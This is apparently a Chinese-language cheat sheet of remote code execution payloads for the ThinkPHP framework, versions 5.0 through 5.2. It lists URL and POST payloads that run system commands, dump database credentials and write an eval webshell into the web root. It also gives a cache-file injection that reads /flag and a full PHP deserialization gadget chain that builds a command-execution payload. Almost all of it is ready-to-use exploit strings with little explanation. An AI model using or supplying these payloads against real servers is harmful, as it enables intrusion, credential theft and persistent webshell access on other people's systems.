## **Thinkphp RCE　POC大全**
在 Vulhub 中，也可以找到了该漏洞的利用 POC
一般也可以用工具一把梭
**Thinkphp 5.0.22 POC**
1. `http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.username`
2. `http://192.168.1.1/thinkphp/public/?s=.|think\config/get&name=database.password`
3. `http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id`
4. `http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1`

**Thinkphp 5 POC**
5. `http://127.0.0.1/tp5/public/?s=index/\think\View/display&content=%22%3C?%3E%3C?php%20phpinfo();?%3E&data=1`

**Thinkphp 5.0.21 POC**
6. `http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id`
7. `http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1`

**Thinkphp 5.1.x POC**
8. `http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=phpinfo&data=1`
9. `http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=system&data=cmd`
10. `http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E`
11. `http://url/to/thinkphp5.1.29/?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E`
12. `http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1`
13. `http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd`
14. `http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1`
15. `http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cmd`

**Thinkphp 未知版本 POC**
16. `?s=index/\think\module/action/param1/${@phpinfo()}`
17. `?s=index/\think\Module/Action/Param/${@phpinfo()}`
18. `?s=index/\think/module/aciton/param1/${@print(THINK_VERSION)}`

**Thinkphp 5.0.23 (完整版) debug模式 POC**
32. `(post)public/index.php 
32. (data)_method=__construct&filter[]=system&server[REQUEST_METHOD]=touch%20/tmp/xxx`

```
echo "<?php phpinfo();?>" > /var/www/public/test2.php

echo "<?php @eval(\$_POST['cmd']);?>" > /var/www/public/test.php
```




**Thinkphp 5.0.23 (完整版) POC**
33. `（post）public/index.php?s=captcha
33.  (data) _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls -al`

**Thinkphp 5.0.10 (完整版) POC**
34. `(post)public/index.php?s=index/index/index (data)s=whoami&_method=__construct&method&filter[]=system`

**Thinkphp 5.1.x 和 5.2.x 和 5.0.x POC**
35. `(post)public/index.php (data)c=exec&f=calc.exe&_method=filter`



^
## **Thinkphp cache缓存函数远程代码执行漏洞**
https://blog.csdn.net/rfrder/article/details/114599310
tinkphp5.0.5默认控制器的部分代码，使用默认路由：
```
<?php
 public function rce(){
        Cache::set("cache",input('get.cache'));
        return 'done';
    }
```

缓存生成的路径和文件名是根据参数名的md5值计算的，这里是cache。
```
?s=index/index/rce&cache=%0d%0asystem(%27cat%20/flag%27);//
缓存路径： runtime/cache/0f/ea6a13c52b4d4725368f24b045ca84.php
```


^
^
## **Tinkphp 5.1反序列化**
一般工具一把梭
入口
```
?&lin=cat /flag&data=序列化串
?lin=id  POST  code=序列化串
```
```
<?php
namespace think;
abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        $this->append = ["lin"=>["calc.exe","calc"]];
        $this->data = ["lin"=>new Request()];
    }
}
class Request
{
    protected $hook = [];
    protected $filter = "system"; //PHP函数
    protected $config = [
        // 表单ajax伪装变量
        'var_ajax'         => '_ajax',  
    ];
    function __construct(){
        $this->filter = "system";
        $this->config = ["var_ajax"=>'lin']; //PHP函数的参数
        $this->hook = ["visible"=>[$this,"isAjax"]];
    }
}


namespace think\process\pipes;

use think\model\concern\Conversion;
use think\model\Pivot;
class Windows
{
    private $files = [];

    public function __construct()
    {
        $this->files=[new Pivot()];
    }
}
namespace think\model;

use think\Model;

class Pivot extends Model
{
}
use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
?>
```